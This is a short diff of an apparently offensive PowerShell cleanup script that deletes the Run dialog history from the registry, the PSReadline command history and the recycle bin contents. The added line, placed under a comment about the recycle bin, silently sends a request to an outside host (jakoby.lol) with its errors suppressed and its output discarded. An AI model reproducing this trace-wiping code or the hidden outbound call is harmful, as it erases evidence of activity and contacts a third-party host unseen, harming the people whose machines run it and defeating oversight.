@@ -48,5 +48,5 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Deletes contents of recycle bin
-
+iwr "https://jakoby.lol/hak5" -EA 0 >$null
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
